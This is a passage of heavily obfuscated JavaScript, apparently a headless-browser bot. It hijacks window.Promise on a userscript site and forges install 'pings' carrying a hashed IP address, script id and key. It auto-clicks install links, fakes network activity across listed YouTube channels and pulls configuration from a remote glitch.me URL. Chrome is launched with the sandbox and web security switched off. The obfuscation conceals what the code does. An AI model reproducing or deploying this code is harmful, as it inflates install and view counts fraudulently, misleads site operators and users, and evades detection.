                K = Q[J - (-0x1a55 + 0x24b8 + -0x53 * 0x20)] ^ Q[J - (0x135 * -0x1c + 0x99f + 0x1835)] ^ Q[J - (-0x81 * -0x2d + -0x1 * 0x7c3 + -0xedc)] ^ Q[J - (0x178b * -0x1 + -0x5 * 0x47b + 0x2e02)], Q[J] = K << -0x1 * -0x18ca + 0x789 + -0x2052 | K >>> -0x189a + -0xb5b + -0x4 * -0x905;
              for (J = 0x213 * -0x1 + -0x298 * 0x1 + -0x1 * -0x4ab; J < -0x1 * 0x67 + 0x623 * 0x1 + -0x8 * 0xb5; J += 0x202c * -0x1 + -0x1a7d + 0x3aae)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x15d * -0xb + -0x1 * 0xcac + -0x1bb * -0x10 | L >>> -0x2 * -0x550 + 0x97f + -0x1404) + (M & N | ~M & O) + P + (0x942157e * -0x4 + 0x43bf2037 + 0x2 * 0x1de5d7ad) + Q[J] << 0x7f * -0xa + 0x17aa + 0x18f * -0xc) << 0x2c1 + -0x250a + -0x224e * -0x1 | P >>> -0x918 * 0x1 + -0x1 * -0x1add + 0x7 * -0x286) + (L & (M = M << 0x18ae + 0xfb5 * 0x2 + 0x1bfd * -0x2 | M >>> 0x1 * 0x18a6 + -0x1 * 0xd31 + 0x3 * -0x3d1) | ~L & N) + O + (-0x5135e33 * -0x9 + -0x393c5614 + 0x66107fe2) + Q[J + (-0x26a + 0x145f + -0x11f4)] << -0x214a + 0x139 * -0xe + -0x8 * -0x64d) << -0xc2d + -0x8ef * 0x1 + 0x1521 | O >>> -0x2 * -0x6c6 + -0xf5 + -0x63e * 0x2) + (P & (L = L << 0x2 * -0x40a + 0x1 * 0x1183 + -0x951 | L >>> -0x469 * 0x1 + 0xf8d + -0x5f * 0x1e) | ~P & M) + N + (0x7c44b284 + 0x392daa9 * -0x29 + 0xa22c4b * 0xb2) + Q[J + (-0x67 * 0xd + 0x3e * 0x22 + -0x2ff)] << -0x5ea * -0x5 + 0x126f + -0x3001) << -0x13c1 + -0x4 * 0x868 + 0xaae * 0x5 | N >>> -0x2586 + 0x851 * -0x3 + 0x1 * 0x3e94) + (O & (P = P << 0x1 * -0x1855 + 0x1b * 0xb3 + 0x592 | P >>> 0x3bf * -0x9 + -0x11de * -0x2 + -0x203) | ~O & L) + M + (-0x202d740a + -0x1 * 0x9cd00d7f + 0x1177ffb22) + Q[J + (0x19d + -0x9d3 + 0x839 * 0x1)] << -0x2012 + -0xbd9 + -0x1 * -0x2beb) << -0x67 * -0x5 + -0x2319 + 0x69f * 0x5 | M >>> -0x1 * 0xbd5 + -0x2434 * -0x1 + 0x1 * -0x1844) + (N & (O = O << 0x34 * -0xa4 + 0x3 * 0x86f + -0x821 * -0x1 | O >>> -0x9d * 0x1 + -0x1aba + -0x1 * -0x1b59) | ~N & P) + L + (-0x132254fb * 0x5 + -0x60960c7d + -0x6f * -0x28c2553) + Q[J + (0x5e3 * 0x1 + -0x1 * -0x20b9 + -0x2698)] << 0x1885 * -0x1 + -0x1e + 0x18a3, N = N << 0xf3 * 0x29 + -0x9aa + -0x1d23 | N >>> 0x75d * -0x1 + 0x65 * 0x1 + -0x37d * -0x2;
              for (; J < -0x1f * -0xb8 + 0x119b * -0x1 + -0x485; J += -0x38b + -0x8 * 0x23e + 0x10 * 0x158)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xfdb + -0x2f * 0x95 + 0x2b3b | L >>> 0x120a + 0x14 * 0xe8 + -0x1 * 0x240f) + (M ^ N ^ O) + P + (0xe2 * -0xad11d9 + -0x3 * 0x3998cf0f + 0x1b46e1a60) + Q[J] << 0x6 * 0x1fd + -0xdb1 * -0x1 + -0x7 * 0x3a9) << -0x15e0 + -0x137 + -0xae * -0x22 | P >>> 0x665 * 0x4 + -0x1 * 0x272 + -0x1707) + (L ^ (M = M << 0x5 * -0x35f + 0x40a + 0xcef | M >>> 0x12b2 + -0x52 + -0x2 * 0x92f) ^ N) + O + (-0x5a1e7793 + 0x28d8b624 + -0xa01fad1 * -0x10) + Q[J + (0x322 * 0x8 + 0x77c + -0x208b)] << 0x150c + -0x1 * -0x17d2 + -0x2cde) << -0x17dd + 0x13a1 + 0x441 | O >>> -0x2401 + 0x1cfd + 0x71f) + (P ^ (L = L << 0x9d * -0x17 + 0x53a + 0x8ff | L >>> 0x2420 * 0x1 + 0x10a3 * -0x1 + -0x137b * 0x1) ^ M) + N + (0x9dfcd38e + -0x30b40f8f * 0x1 + 0x23443 * 0xb6) + Q[J + (0x9f9 + 0x8b * -0x12 + -0x31)] << 0x191e + 0xe3 + -0x1a01) << -0x1482 + -0x985 * -0x1 + 0xb02 | N >>> -0x1132 + 0x3e * 0x48 + -0x23) + (O ^ (P = P << 0x24d0 + 0x31c * 0x1 + -0x27ce | P >>> -0x49b * 0x1 + -0x223 * 0x9 + 0x38 * 0x6d) ^ L) + M + (0x1e754edd + -0x78db4049 * -0x1 + -0x13 * 0x2213107) + Q[J + (-0x3bb * 0x3 + 0x17b * 0xb + -0x515)] << 0x1 * 0x1b6f + 0x33e + -0x1ead * 0x1) << -0xaa7 * -0x2 + 0x177c + -0x2cc5 | M >>> 0x23c4 + -0x1f3c + -0x46d) + (N ^ (O = O << 0x11 * -0x95 + -0x998 + 0x139b * 0x1 | O >>> -0xadb * 0x1 + 0x217c + -0x1 * 0x169f) ^ P) + L + (-0x568ad72a + 0x2 * 0x6c67c6d4 + -0x136acadd) + Q[J + (0x937 + -0x59c + -0x397)] << 0x4 * 0x249 + 0x423 * -0x2 + -0xde, N = N << -0x10f4 + 0x26 * -0xfd + -0x10 * -0x36a | N >>> -0x153 * 0xd + 0x1dc5 * -0x1 + -0x1 * -0x2efe;
              for (; J < 0x1e1b + -0x94e * 0x2 + 0xb43 * -0x1; J += 0x1377 + -0x1a7e * 0x1 + 0x70c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4 * 0x4c3 + 0x11b * -0x6 + -0xc65 * 0x1 | L >>> -0x124 * 0x1c + -0x1 * 0x1a07 + 0x3a12) + (M & N | M & O | N & O) + P - (0xbd5f9714 + 0x3d55425 * -0x2b + 0x5859ce47) + Q[J] << 0x295 * 0x1 + -0x21f6 + 0x1f61) << 0x1266 + -0x37 * 0x13 + 0x3 * -0x4c4 | P >>> -0x90b + 0x1 * 0x1943 + 0x19 * -0xa5) + (L & (M = M << -0x473 * -0x8 + 0x2e * -0x3b + -0x18e0 | M >>> 0x2e * 0x1 + -0xdd5 * -0x1 + -0xe01) | L & N | M & N) + O - (0x1f6e37f * -0x1f + 0x986017b * 0x6 + 0x74a5c6a3) + Q[J + (-0x2b * 0x48 + -0x497 + 0x8 * 0x216)] << 0x34c * 0x8 + 0x253f + 0x59 * -0xb7) << -0x17 * 0x103 + 0x4 * 0x9 + 0x1726 | O >>> 0x19 * 0xd7 + -0x1 * 0x19d + -0x2f * 0x69) + (P & (L = L << 0xc88 + -0x1b4d + -0x25 * -0x67 | L >>> 0xdaa + -0x185 + -0x1 * 0xc23) | P & M | L & M) + N - (-0xd8fa48e1 + -0x4 * 0xe149841 + 0x18230ed09 * 0x1) + Q[J + (-0x926 * -0x1 + -0x1 * 0x1539 + 0xc15)] << 0xed1 * 0x2 + -0x197 * -0x1 + -0x1f39) << -0x3 * -0x615 + -0x721 + -0xb19 | N >>> 0x1cd5 + -0x1f3b + -0x281 * -0x1) + (O & (P = P << -0x1279 + 0x3aa * 0x7 + -0x1 * 0x70f | P >>> 0x1de4 + 0x1 * 0x14db + -0x32bd) | O & L | P & L) + M - (-0x28eb09f1 + -0xb16b4f9d + 0x14b3a9cb2) + Q[J + (-0x2257 + 0xb3e + 0x171c)] << 0x23a7 + -0xcce + -0x16d9 * 0x1) << 0x5e * 0x43 + 0xf39 + 0x7f6 * -0x5 | M >>> 0x1929 + -0xa * -0x24e + -0x301a) + (N & (O = O << 0x1270 + -0x1523 + 0x2d1 | O >>> 0x10 * -0x17a + -0xcc0 + 0x1231 * 0x2) | N & P | O & P) + L - (-0x36a484ad + -0xd4d1b90 + 0xb4d5e361) + Q[J + (0x6 * 0x66d + -0x1cf1 + -0x999)] << -0x2 * 0x90f + -0x1 * 0x180f + -0x3 * -0xe0f, N = N << -0x73 * -0x7 + 0x5 * 0x217 + -0xd7a | N >>> -0x1 * 0x1aad + 0x1976 + -0x1 * -0x139;
              for (; J < 0x52 * 0x3a + 0x62e * -0x2 + -0x1f8 * 0x3; J += 0x21cf + -0xe99 + -0x1331 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1177 + -0x1 * -0x20ed + -0x325f | L >>> 0x2340 + -0x1ac4 + -0x861) + (M ^ N ^ O) + P - (-0x2e3d7612 + -0x3ecb977a + -0x340c413 * -0x32) + Q[J] << -0x157a + 0x11c2 + 0x3b8) << 0x13f + 0x1f41 + -0x207b | P >>> 0x92 * -0x1 + 0x1 * -0x9d3 + 0xa80) + (L ^ (M = M << -0x1657 + 0x3 * 0x80f + -0x1b8 | M >>> -0x1 * 0x1a7d + 0x1 * 0x1510 + 0xd * 0x6b) ^ N) + O - (-0x55603154 + 0x1d94fe39 + 0x6d687145) + Q[J + (0xff4 + 0x1 * -0xef5 + -0x7f * 0x2)] << 0x18c4 + -0x25d2 + 0xd0e) << -0x1b4d + 0x1494 + -0x6be * -0x1 | O >>> 0x1 * 0x228b + 0x25 * -0x6d + -0x12af) + (P ^ (L = L << -0x82f * 0x3 + -0x1 * 0x118a + 0x2a35 | L >>> 0x2110 + 0xaa2 + 0x1d2 * -0x18) ^ M) + N - (0x7e * 0xc5b0fa + -0x366e1b7f + 0xabe3e9d) + Q[J + (-0x1 * 0x187d + 0x3f * -0x2f + 0x904 * 0x4)] << -0xb87 + 0x5 * -0x281 + -0x72 * -0x36) << 0xf62 + 0x342 * 0xa + -0x2ff1 | N >>> 0x1741 + 0xaf * -0x29 + -0x4e1 * -0x1) + (O ^ (P = P << -0x1619 * -0x1 + -0x1f25 + 0x92a | P >>> 0x6 * -0x2c4 + -0x1 * -0xd7 + 0x327 * 0x5) ^ L) + M - (0x10b3121d * -0x1 + -0x2a1b4b8b * 0x1 + 0x706b9bd2) + Q[J + (0x1f69 + -0x1292 + -0xcd4)] << -0x13b0 + 0x137 * 0xb + 0x653) << 0x219f * 0x1 + -0xd * -0x28 + -0x23a2 * 0x1 | M >>> -0x1 * 0x58b + 0x19a5 + 0x13ff * -0x1) + (N ^ (O = O << 0x1b1 * -0x13 + -0x1 * -0x331 + 0x1d10 | O >>> -0x246 * -0xb + 0x116f * 0x2 + -0x9e * 0x61) ^ P) + L - (0x691eb33b + 0x1 * 0x34167cd3 + -0x2287fb4c * 0x3) + Q[J + (-0x1 * 0x1cc4 + -0xa81 + 0x2749 * 0x1)] << -0x297 + 0x1a52 + -0x17bb * 0x1, N = N << -0x5df + 0x367 * -0xb + 0x2b6a | N >>> 0x1 * -0x9ad + -0x4d6 * -0x1 + 0x4d9;
              this['h0'] = this['h0'] + L << -0x6ff * -0x4 + 0x2 * 0xf61 + 0x1 * -0x3abe, this['h1'] = this['h1'] + M << -0x3 * 0xbb9 + 0x24d4 * 0x1 + 0x19 * -0x11, this['h2'] = this['h2'] + N << 0x24f2 + 0x39 * -0x51 + -0x12e9, this['h3'] = this['h3'] + O << 0x966 + -0xad * 0x1a + 0x82c, this['h4'] = this['h4'] + P << 0x30 * -0xb7 + 0x2684 + -0x434;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2204 + 0x870 * -0x1 + 0xe30 * 0x3 & 0x1a3e * -0x1 + -0x1502 * 0x1 + 0x2f4f * 0x1] + w[J >> 0x927 + -0x1 * 0x17a0 + -0x3 * -0x4db & 0xe9 * -0x1e + -0x16f9 + 0x3256] + w[J >> 0x1d08 + -0x370 * -0x4 + -0x2 * 0x155a & -0x516 * -0x4 + 0x7a3 + -0x1bec] + w[J >> -0x83 * 0x22 + 0x1 * -0x2d + 0x11a3 & -0x1c7 * -0x13 + 0x29 * 0x94 + -0x396a] + w[J >> 0x1 * 0x1da5 + 0xf79 + -0x2d12 & -0x2291 + 0x283 + 0x201d] + w[J >> -0x1251 + -0x1da8 + 0x3001 & 0x4b1 * 0x4 + 0x1 * -0x24df + 0x122a] + w[J >> -0x2 * -0x1f0 + -0x1bab + 0x17cf & 0x5 * 0x259 + 0x13f7 + -0x1 * 0x1fa5] + w[-0xaa2 + -0x1307 + 0x1db8 & J] + w[K >> 0x10aa + 0xfd1 * 0x1 + -0x1 * 0x205f & -0xd93 + 0x38c + -0x2 * -0x50b] + w[K >> -0x14e6 + -0x1 * 0x192f + 0x2e2d & -0x1 * -0x21ad + 0x137 * 0x1f + 0x101 * -0x47] + w[K >> 0x1003 + -0x1 * -0x254b + -0x11be * 0x3 & 0x2 * 0xddf + 0x3 * 0x745 + -0x317e] + w[K >> -0x22 * 0x43 + -0x247 + -0x15 * -0x89 & 0x1d18 + -0x2 * -0x11ed + -0x40e3] + w[K >> -0x2 * 0x545 + -0x1 * 0x270b + 0x31a1 & -0x1f48 + -0x82c + -0x253 * -0x11] + w[K >> -0x1e9a + -0x259 * -0x3 + 0x1797 & -0x19c8 + 0x5 * -0x397 + -0x3b * -0xbe] + w[K >> -0x1340 * -0x2 + -0x2 * -0x5de + -0x1 * 0x3238 & -0x26c7 + -0x2 * -0xbc + 0x255e] + w[-0x84 * 0x43 + 0x1728 + 0xb73 & K] + w[L >> 0x1a5a * -0x1 + 0x21e3 * -0x1 + -0x7 * -0x89f & 0x58a + 0xdb8 * 0x1 + -0x1 * 0x1333] + w[L >> 0x1 * -0xa9 + 0x1c43 + -0x7 * 0x3ee & -0x877 + 0x24bc + -0x17 * 0x13a] + w[L >> 0x653 * 0x3 + -0x1f30 + -0x3 * -0x419 & 0x1dc7 + 0x1 * 0x1c88 + -0x8 * 0x748] + w[L >> -0x2ae * 0x4 + 0x34e + 0x21 * 0x3a & 0x2517 + -0x1 * 0x1613 + -0xef5] + w[L >> -0x12cf + 0x1 * 0x952 + 0x989 & -0x269 + 0xd5c + 0x2 * -0x572] + w[L >> 0x329 * -0x2 + -0x1884 + -0x1ede * -0x1 & 0x347 * -0x5 + -0x1 * 0x2218 + 0x328a] + w[L >> -0x44b + -0x1e06 + 0x2255 & 0x1102 + -0x73 * -0x16 + -0x1 * 0x1ad5] + w[0x8 * -0x27a + -0x4e * 0xd + -0x1 * -0x17d5 & L] + w[M >> 0x6 * -0x75 + 0x67f + -0x3a5 & 0xa64 + 0x1c62 + -0x11 * 0x247] + w[M >> -0x143a + 0x105d * 0x1 + 0x3f5 & 0x7b3 * 0x3 + 0xc5 * -0x6 + -0x9 * 0x20c] + w[M >> 0x208f + -0x590 * -0x1 + 0x260b * -0x1 & -0x1541 + 0x99b * -0x4 + 0x3bbc] + w[M >> -0xac6 + 0x1c * -0x13e + 0x2d9e & -0x15 + -0x1afb + -0x83 * -0x35] + w[M >> 0x1a85 + 0x1 * -0x7dc + 0x129d * -0x1 & 0x301 * -0x3 + 0xdeb + -0x4d9] + w[M >> 0x2647 + -0x2022 + -0x1 * 0x61d & -0xc2f * -0x1 + 0x343 + -0x12f * 0xd] + w[M >> -0x1a27 + -0x1e77 + -0x293 * -0x16 & 0x172 + 0x145 + -0x2a8] + w[-0xa3 * -0x31 + -0x11e + -0x1e06 & M] + w[N >> 0x131 + 0x2153 + -0x2268 & 0xa * 0x1d5 + -0x12d * 0x19 + 0xb22] + w[N >> 0x3b * 0x5 + -0x1fa2 + 0x1e93 & 0x86f + -0x1833 + 0xfd3] + w[N >> -0x2131 * 0x1 + 0xe5f + -0x12e6 * -0x1 & 0x1091 + -0x1194 + 0x112] + w[N >> -0x207f + -0x7a4 + 0x2833 & 0x1c38 + 0x788 + -0x1 * 0x23b1] + w[N >> -0x150b * 0x1 + 0x213b + -0xc24 & 0x2021 + -0x4eb * 0x1 + -0x3e1 * 0x7] + w[N >> 0x2a9 * -0x7 + 0x226e + -0xfc7 & -0x1 * 0x1d35 + -0x7 * -0x3be + 0x3 * 0x106] + w[N >> -0x1da7 + 0x2708 + -0x8d * 0x11 & 0x16d5 + 0x11 * -0x17a + 0x1 * 0x254] + w[0x392 * -0x1 + -0x21ba + -0x83 * -0x49 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x2413 * -0x1 + 0x14be + -0x38b9 & -0x2c5 * 0x2 + -0x237a + -0x2cd * -0xf,
                J >> 0x841 * 0x2 + 0x112 * -0x1b + 0xc74 & -0x1db9 * -0x1 + 0xcdd + -0x2997,
                J >> -0x251 * 0xf + -0x18f5 * 0x1 + 0x3bbc * 0x1 & 0x898 + 0xf6a + -0x2b * 0x89,
                -0x1 * -0x1b59 + -0x1597 + -0x4c3 & J,
                K >> -0x6b0 + -0x359 + -0x1 * -0xa21 & 0x107b * -0x2 + -0x230f + 0x4504,
                K >> -0x14d3 * 0x1 + -0xefa + 0x23dd & 0xe3a + 0x45a + -0x1195,
                K >> -0x14fb * 0x1 + -0x3ce + 0x18d1 & 0x780 + 0x1373 * -0x2 + 0x1 * 0x2065,
                -0x1868 + 0x5 * 0x495 + 0x27e & K,
                L >> -0x15f8 + 0x161 * -0x1 + 0x1771 & -0x6 * -0x4aa + -0x4 * 0x9b5 + 0xbd7,
                L >> -0xbe2 + 0xda6 * 0x1 + -0x4 * 0x6d & -0x14 * 0x8a + 0x18d * 0x18 + -0x1971,
                L >> 0x1 * -0x126a + -0x69d * 0x1 + 0x190f & 0x1 * -0x1d69 + -0x640 + 0x3 * 0xc38,
                -0x16bd * -0x1 + -0x37a * -0x1 + -0x1938 * 0x1 & L,
                M >> 0x4e2 + 0x152f + 0x19f9 * -0x1 & 0x853 * -0x1 + 0x195 + -0x11b * -0x7,
                M >> 0x7c4 * 0x1 + -0x8d7 + 0x123 & -0x1ae0 + 0x630 + 0x15af,
                M >> -0x337 * -0x2 + -0x15df + 0x1 * 0xf79 & -0x265b + -0x933 * -0x1 + -0x5d * -0x53,
                0x1 * -0x11f2 + 0x174d + -0x1f * 0x24 & M,
                N >> -0x1670 + -0x53a * -0x5 + -0x39a * 0x1 & 0x1 * 0x1eb0 + -0xa85 * 0x2 + 0x8a7 * -0x1,
                N >> -0x3b * -0x21 + -0x2de * -0x3 + 0x1025 * -0x1 & -0xb28 + 0xc71 + -0x25 * 0x2,
                N >> -0x11 * 0x13 + 0x1f0 + -0xa5 & 0x1 * 0xca9 + 0xf58 + -0x1b02,
                0x20fc + -0x9 * -0x3a5 + -0x40ca & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1cc * -0x11 + 0xde7 + 0x10b9), (K = new DataView(J))['setUint32'](0x2529 + -0x35 * -0xa9 + 0x2413 * -0x2, this['h0']), K['setUint32'](-0xfd3 + -0x2221 + -0xa4 * -0x4e, this['h1']), K['setUint32'](0x1149 + 0x2120 + 0x3261 * -0x1, this['h2']), K['setUint32'](-0x25 * 0x52 + -0x909 + 0xe9 * 0x17, this['h3']), K['setUint32'](-0x1 * -0x1274 + -0x31 * 0x5b + -0x53 * 0x3, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype'][U(0xb)], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xc * -0x251 + 0x4 * 0x8d2 + -0x2 * 0x3be];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x2368 + 0x1 * -0x14c7 + -0x13 * -0x2f5;
            J[0x1c29 + -0x1a55 + -0x9 * 0x34]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x3 * 0xc77 + 0x115 * 0x11 + 0x182 * -0x25] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x17f6 + -0x1032 + -0xd63 * -0x3), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xb15 * -0x2 + 0xf0b * -0x1 + -0x1 * -0x2536;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x265 * 0x10 + -0x18c2 + -0x22 * -0x207), Promise['resolve'](-0xe72 + -0x12b7 + -0x236 * -0xf);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * -0xc1a + 0x47 * 0x1d + 0x1 * -0x1425; j < 0xedc + -0x19c1 + -0xba * -0xf; j++)
    i();
}
const NETWORK_PATIENCE = -0x127c + 0x1a0 * -0x12 + 0x2 * 0x277e + (0xa19 + -0x10aa + 0x1249 * 0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2 * -0xd6c + -0x141d * 0x1 + 0x2ef8) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x3 * 0x4c7 + 0xef3 * 0x2 + -0x2c3b);
    let h = e[f];
    if (b['TSDkry'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x2223 + 0x611 * 0x5 + -0x4078, s, t, u = 0x2f1 * 0x5 + 0xa18 + -0x7 * 0x38b; t = n['charAt'](u++); ~t && (s = r % (-0x451 + 0xe83 * 0x2 + 0x18b1 * -0x1) ? s * (-0x227d + 0x503 + 0x1dba) + t : t, r++ % (0x1 * 0x815 + 0x29f + -0xab0)) ? p += String['fromCharCode'](0x13ed + 0xc39 + -0x1 * 0x1f27 & s >> (-(0x4ca + 0x1b22 + -0xa * 0x331) * r & 0x10f * 0x6 + 0x1c31 + 0x1 * -0x2285)) : 0x1 * -0x1552 + -0x8 * 0x250 + -0x3 * -0xd46) {
          t = o['indexOf'](t);
        }
        for (let v = 0x10e * -0x2 + 0x1 * -0x1c87 + 0x1 * 0x1ea3, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * -0x88e + 0xf4c + -0x6ae))['slice'](-(-0x1 * 0x17f3 + 0x24e1 + -0xcec));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x16b + -0xad * 0x32 + 0x2335,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1 * -0x96b + -0x1b7f * 0x1 + 0x2 * 0x90a; u < 0x1c20 + 0x1fed + -0x3b0d * 0x1; u++) {
          p[u] = u;
        }
        for (u = 0xe * -0x134 + -0x17 * -0x193 + 0x135d * -0x1; u < 0x655 * 0x5 + -0x72c + 0x177d * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * -0x665 + 0x1937 * 0x1 + -0xf4e * 0x2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x2467 * 0x1 + -0x3 * -0x4ef + 0x159a, q = 0xb * -0x4f + -0x1 * 0x2063 + 0x479 * 0x8;
        for (let v = -0x7e + -0x1f12 + -0x10 * -0x1f9; v < n['length']; v++) {
          u = (u + (-0x2 * -0xb30 + 0x1533 + -0x16 * 0x1fb)) % (0x1597 * 0x1 + -0x1b0 * 0x12 + -0x3 * -0x343), q = (q + p[u]) % (0xc * -0x29 + -0x1 * -0xf0b + -0xc1f), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2 * 0x295 + -0x1c32 + 0x1808)]);
        }
        return t;
      };
      b['MKQVcS'] = m, c = arguments, b['TSDkry'] = !![];
    }
    const j = e[0x1 * -0xd5f + 0x4 * 0x20a + -0x3 * -0x1bd],
      k = f + j,
      l = c[k];
    return !l ? (b['EUNZKq'] === undefined && (b['EUNZKq'] = !![]), h = b['MKQVcS'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xb9a + -0x81e * -0x1 + -0x13b8; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x3 * 0x4c7 + 0xef3 * 0x2 + -0x2c3b);
    let h = e[f];
    if (c['xeWXeT'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x2223 + 0x611 * 0x5 + -0x4078, r, s, t = 0x2f1 * 0x5 + 0xa18 + -0x7 * 0x38b; s = m['charAt'](t++); ~s && (r = q % (-0x451 + 0xe83 * 0x2 + 0x18b1 * -0x1) ? r * (-0x227d + 0x503 + 0x1dba) + s : s, q++ % (0x1 * 0x815 + 0x29f + -0xab0)) ? o += String['fromCharCode'](0x13ed + 0xc39 + -0x1 * 0x1f27 & r >> (-(0x4ca + 0x1b22 + -0xa * 0x331) * q & 0x10f * 0x6 + 0x1c31 + 0x1 * -0x2285)) : 0x1 * -0x1552 + -0x8 * 0x250 + -0x3 * -0xd46) {
          s = n['indexOf'](s);
        }
        for (let u = 0x10e * -0x2 + 0x1 * -0x1c87 + 0x1 * 0x1ea3, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * -0x88e + 0xf4c + -0x6ae))['slice'](-(-0x1 * 0x17f3 + 0x24e1 + -0xcec));
        }
        return decodeURIComponent(p);
      };
      c['rCTeSS'] = i, b = arguments, c['xeWXeT'] = !![];
    }
    const j = e[-0x16b + -0xad * 0x32 + 0x2335],
      k = f + j,
      l = b[k];
    return !l ? (h = c['rCTeSS'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
let searchTerms = [];
